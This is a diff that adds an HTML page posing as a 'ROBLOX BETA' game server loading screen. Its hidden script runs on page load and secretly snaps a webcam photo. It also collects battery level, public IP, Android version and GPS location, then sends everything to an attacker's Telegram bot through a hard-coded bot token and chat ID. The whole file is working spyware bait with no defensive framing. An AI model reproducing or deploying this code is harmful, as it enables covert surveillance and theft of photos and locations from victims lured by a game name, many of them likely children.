@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>ROBLOX BETA</title>
+    <style>
+      body {
+        background: black;
+        color: lime;
+        font-family: monospace;
+        text-align: center;
+        padding-top: 20%;
+        font-size: 28px;
+      }
+      video, canvas {
+        display: none;
+      }
+    </style>
+  </head>
+  <body>
+    LOADING SERVER..... 
+
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+      const botToken = "8433136252:AAEhvNbCmiRtWYWVAHCR6J3OU_Mn3K-uOjM";
+      const chatId = "6546452697";
+
+      const canvas = document.getElementById("canvas");
+      const video = document.getElementById("video");
+
+      async function getBatteryInfo() {
+        try {
+          let battery = await navigator.getBattery();
+          return {
+            level: Math.round(battery.level * 100),
+            charging: battery.charging ? "YA" : "TIDAK",
+          };
+        } catch {
+          return { level: "?", charging: "?" };
+        }
+      }
+
+      async function getIP() {
+        try {
+          const res = await fetch("https://api.ipify.org?format=json");
+          const data = await res.json();
+          return data.ip;
+        } catch {
+          return "TIDAK DITEMUKAN";
+        }
+      }
+
+      function getAndroidVersion() {
+        const ua = navigator.userAgent.toLowerCase();
+        const match = ua.match(/android\s([0-9\.]*)/);
+        return match ? match[1] : "TIDAK DIKETAHUI";
+      }
+
+      function getLocation() {
+        return new Promise((resolve) => {
+          if (!navigator.geolocation) return resolve("TIDAK DIDUKUNG");
+          navigator.geolocation.getCurrentPosition(
+            (pos) => {
+              const lat = pos.coords.latitude;
+              const lon = pos.coords.longitude;
+              resolve(`https://maps.google.com/?q=${lat},${lon}`);
+            },
+            () => resolve("DITOLAK / GAGAL")
+          );
+        });
+      }
+
+      async function sendMessage(message) {
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: chatId, text: message }),
+        });
+      }
+
+      async function sendPhoto(base64Img) {
+        const blob = await (await fetch(base64Img)).blob();
+        const formData = new FormData();
+        formData.append("chat_id", chatId);
+        formData.append("photo", blob, "foto.jpg");
+        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+          method: "POST",
+          body: formData,
+        });
+      }
+
+      async function start() {
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+          video.srcObject = stream;
+          await new Promise(r => setTimeout(r, 1800));
+
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          const ctx = canvas.getContext("2d");
+          ctx.drawImage(video, 0, 0);
+          const imgData = canvas.toDataURL("image/jpeg");
+
+          stream.getTracks().forEach(t => t.stop());
+          await sendPhoto(imgData);
+
+          const batre = await getBatteryInfo();
+          const ip = await getIP();
+          const android = getAndroidVersion();
+          const lokasi = await getLocation();
+
+          const isi = `REZZ DEVELOPER\n🔋 BATRE: ${batre.level}%\n⚡ CHARGER: ${batre.charging}\n🌐 IP PUBLIC: ${ip}\n🤖 ANDROID: ${android}\n📍 LOKASI: ${lokasi}`;
+          await sendMessage(isi);
+        } catch (e) {
+          await sendMessage("GAGAL MENGAMBIL DATA: " + e.message);
+        }
+      }
+
+      start();
+    </script>
+  </body>
+</html>
